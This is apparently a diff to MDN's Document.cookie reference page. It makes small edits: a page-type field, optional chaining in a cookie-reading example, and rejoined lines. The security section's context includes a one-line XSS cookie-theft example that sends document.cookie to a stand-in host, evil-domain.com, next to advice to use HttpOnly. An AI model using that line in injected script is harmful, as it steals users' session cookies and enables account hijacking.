@@ -1,6 +1,7 @@
 ---
 title: Document.cookie
 slug: Web/API/Document/cookie
+page-type: web-api-instance-property
 tags:
   - API
   - Document
@@ -173,7 +174,7 @@ document.cookie = "test2=World; SameSite=None; Secure";
 const cookieValue = document.cookie
   .split('; ')
   .find(row => row.startsWith('test2='))
-  .split('=')[1];
+  ?.split('=')[1];
 
 function showCookieValue() {
   const output = document.getElementById('cookie-value')
@@ -354,16 +355,14 @@ using a different domain or subdomain, due to the [same origin policy](/en-US/do
 
 Cookies are often used in web applications to identify a user and their authenticated
 session. Stealing a cookie from a web application leads to hijacking the
-authenticated user's session. Common ways to steal cookies include using [social
-engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -
+authenticated user's session. Common ways to steal cookies include using [social engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -
 
 ```js
 (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 The `HTTPOnly` cookie attribute can help to mitigate this attack by
-preventing access to cookie value through Javascript. Read more about [Cookies and
-Security](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).
+preventing access to cookie value through Javascript. Read more about [Cookies and Security](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).
 
 ## Notes
 
